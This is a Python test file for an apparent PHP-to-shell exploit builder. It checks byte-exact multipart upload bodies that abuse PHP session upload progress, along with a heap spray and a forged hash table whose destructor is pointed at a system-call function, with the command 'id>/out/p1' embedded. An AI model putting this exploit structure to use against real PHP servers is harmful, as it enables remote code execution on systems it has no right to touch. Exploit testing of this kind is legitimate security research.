import hashlib
import unittest

from php2shell_check import payload

CASES = {
    "A1": (payload.build_a1(), 1060211,
           "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"),
    "B1": (payload.build_b1(), 33128677,
           "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"),
    "A2": (payload.build_a2(), 279369,
           "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"),
    "HT": (payload.build_ht(0x40080F8398, 0x4005EFE370, b"id>/out/p1"), 384,
           "7b656ae6949b2c0d75d1f86d4ec0a552b0386a508c516b5e873bec38578279f6"),
    "SPRAY": (payload._spray(384, 0x40080F8398, 1, 0x0107), 384,
              "fc96e4b8e2cc622a61eede70697c674f1d7732e6ed740ecc2ec58bb49e030eca"),
}


class PayloadTests(unittest.TestCase):
    def test_wire_bodies_are_byte_exact(self):
        for name, (body, length, digest) in CASES.items():
            with self.subTest(name=name):
                self.assertEqual(len(body), length)
                self.assertEqual(hashlib.sha256(body).hexdigest(), digest)

    def test_b1_starts_with_session_and_progress(self):
        body = payload.build_b1()
        self.assertTrue(body.startswith(b"--CCCCCCCCCC\r\n"))
        self.assertIn(b'name="PHPSESSID"', body)
        self.assertIn(b'name="PHP_SESSION_UPLOAD_PROGRESS"', body)

    def test_a1_has_empty_file_parts(self):
        body = payload.build_a1()
        self.assertIn(b'name="files[R00000KKKK', body)
        self.assertIn(b'; filename=""', body)

    def test_ht_has_system_destructor(self):
        zif = 0x4005EFE370
        ht = payload.build_ht(0x40080F8398, zif, b"id")
        self.assertEqual(int.from_bytes(ht[0x30:0x38], "little"), zif)


if __name__ == "__main__":
    unittest.main()
